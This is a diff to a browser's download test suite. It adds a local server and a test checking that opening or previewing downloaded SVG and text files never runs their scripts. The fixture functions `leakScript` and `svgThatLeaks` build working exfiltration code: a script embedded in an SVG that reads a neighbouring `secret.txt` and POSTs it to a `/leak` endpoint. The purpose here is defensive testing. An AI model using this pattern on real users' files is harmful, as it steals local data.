@@ -32,7 +32,9 @@ import { openSettings } from './settings-support'
  * - `/slow/<name>?size=&rate=` at `rate` bytes per second;
  * - `/cut/<name>?size=` a quarter, then the connection breaks, and every request breaks until the
  *   test repairs it;
- * - `/inline/<name>` as a page would serve it, with its type and no "attachment" (DL-13).
+ * - `/inline/<name>` as a page would serve it, with its type and no "attachment" (DL-13);
+ * - `/attach/<name>` a file with content of its own (`ATTACHED`), as an attachment;
+ * - `/leak?from=` takes what a downloaded file's script sends (D53): it must get nothing.
  */
 
 const MB = 1024 * 1024
@@ -45,6 +47,8 @@ interface DownloadServer {
   repair: (name: string) => void
   /** The requests for a file so far, with the byte range each asked for. */
   requests: (name: string) => { range?: string }[]
+  /** What downloaded files' scripts sent to `/leak`: `<file>: <what it sent>`. */
+  leaks: () => string[]
   close: () => Promise<void>
 }
 
@@ -78,6 +82,30 @@ const INLINE: Record<string, { type: string; data: () => Buffer }> = {
   mp3: { type: 'audio/mpeg', data: () => body(2048) },
 }
 
+/**
+ * Files sent as attachments (`/attach/<name>`), given where `/leak` is. An SVG and a text file with a
+ * script that says it ran, reads the file `secret.txt` beside it and sends it on.
+ */
+const ATTACHED: Record<string, (leak: string) => string> = {
+  'pic.svg': (leak) => svgThatLeaks(leak),
+  'chart.svg': (leak) => svgThatLeaks(leak),
+  'note.txt': (leak) => `<!doctype html><title>Note</title><script>${leakScript(leak)}</script>`,
+}
+
+function leakScript(leak: string): string {
+  return `const from = location.pathname.split('/').pop();
+fetch('${leak}?from=' + from, { method: 'POST', mode: 'no-cors', body: 'ran' });
+fetch('secret.txt').then((r) => r.text()).then((text) =>
+  fetch('${leak}?from=' + from, { method: 'POST', mode: 'no-cors', body: text }));`
+}
+
+function svgThatLeaks(leak: string): string {
+  return `<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
+<rect width="64" height="64" fill="#6b7cff"/>
+<script><![CDATA[${leakScript(leak)}]]></script>
+</svg>`
+}
+
 function body(size: number): Buffer {
   const out = Buffer.alloc(size)
   for (let i = 0; i < size; i++) out[i] = i % 251
@@ -90,12 +118,34 @@ async function startDownloadServer(): Promise<DownloadServer> {
   const broken = new Set<string>()
   const repaired = new Set<string>()
   const log = new Map<string, { range?: string }[]>()
+  const leaks: string[] = []
   const open = new Set<ServerResponse>()
   const server = createServer((req, res) => {
     const u = new URL(req.url ?? '/', 'http://localhost')
     const [kind, raw = ''] = u.pathname.split('/').filter(Boolean)
     const name = decodeURIComponent(raw)
     const size = Number(u.searchParams.get('size') ?? 1024)
+    if (kind === 'leak') {
+      let sent = ''
+      req.on('data', (chunk) => {
+        sent += String(chunk)
+      })
+      req.on('end', () => {
+        leaks.push(`${u.searchParams.get('from')}: ${sent}`)
+        res.writeHead(204)
+        res.end()
+      })
+      return
+    }
+    const attached = kind === 'attach' ? ATTACHED[name] : undefined
+    if (attached) {
+      res.writeHead(200, {
+        'content-type': 'application/octet-stream',
+        'content-disposition': `attachment; filename="${name}"`,
+      })
+      res.end(attached(`http://localhost:${(server.address() as AddressInfo).port}/leak`))
+      return
+    }
     if (kind === 'page') {
       res.writeHead(200, { 'content-type': 'text/html' })
       res.end(
@@ -190,6 +240,7 @@ async function startDownloadServer(): Promise<DownloadServer> {
       repaired.add(name)
     },
     requests: (name) => log.get(name) ?? [],
+    leaks: () => [...leaks],
     close: () =>
       new Promise((r) => {
         for (const res of open) res.destroy()
@@ -699,6 +750,44 @@ test('[DL-04] a file moved away shows "File Missing" and downloads again', async
   expect((await entry('data.csv')).missing).toBeUndefined()
   expect((await entry('data.csv')).id).not.toBe(id)
   expect(statSync(join(folder(), 'data.csv')).size).toBe(4096)
+})
+
+test('[DL-04][DL-13] a downloaded SVG opens in its app, never as a page whose script could read other files', async () => {
+  const { page } = await openPage()
+  await startDownloads(page, '/attach/pic.svg', '/attach/chart.svg', '/attach/note.txt')
+  await expect.poll(async () => (await list()).filter((d) => d.state === 'completed').length).toBe(3)
+  // A file of the user's beside them: a script running in a file: page could read it.
+  writeFileSync(join(folder(), 'secret.txt'), 'TOP-SECRET-LOCAL-FILE')
+  const tabs = await tabCount()
+  const opened = () => hooks((h) => h.opened)
+  /** Until the file has gone to its app, or its script has sent something. */
+  const handled = (name: string) =>
+    expect
+      .poll(
+        async () =>
+          server.leaks().some((l) => l.startsWith(`${name}:`)) || (await opened()).includes(join(folder(), name)),
+      )
+      .toBe(true)
+  // Clicked in the sidebar, the recent files or the flyout (downloads.open)…
+  expect(await run(orbit.app, 'downloads.open', { id: await idOf('pic.svg') })).toBe(true)
+  await handled('pic.svg')
+  expect.soft(server.leaks(), 'what opening pic.svg sent').toEqual([])
+  // …or previewed from the Library (a Peek).
+  expect(await run(orbit.app, 'downloads.preview', { id: await idOf('chart.svg'), tab: false })).toBe(true)
+  await handled('chart.svg')
+  expect.soft(server.leaks(), 'what previewing chart.svg sent').toEqual([])
+  expect(await opened()).toEqual([join(folder(), 'pic.svg'), join(folder(), 'chart.svg')])
+  // No tab or Peek shows either.
+  expect(await tabCount()).toBe(tabs)
+  const win = Object.values((await state(orbit.app)).windows)[0]
+  expect(win?.overlay?.kind ?? 'none').toBe('none')
+  // Plain text still opens in a tab, as text: the markup in it shows, and its script never runs.
+  expect(await run(orbit.app, 'downloads.open', { id: await idOf('note.txt') })).toBe(true)
+  const text = await tabPage(orbit.app, 'note.txt')
+  await expect.poll(() => text.evaluate(() => document.contentType)).toBe('text/plain')
+  expect(await text.evaluate(() => document.querySelectorAll('script').length)).toBe(0)
+  await expect(text.locator('body')).toContainText('<script>')
+  expect(server.leaks()).toEqual([])
 })
 
 test('[DL-08] Remove from List keeps the file; Delete File moves it to the Trash', async () => {
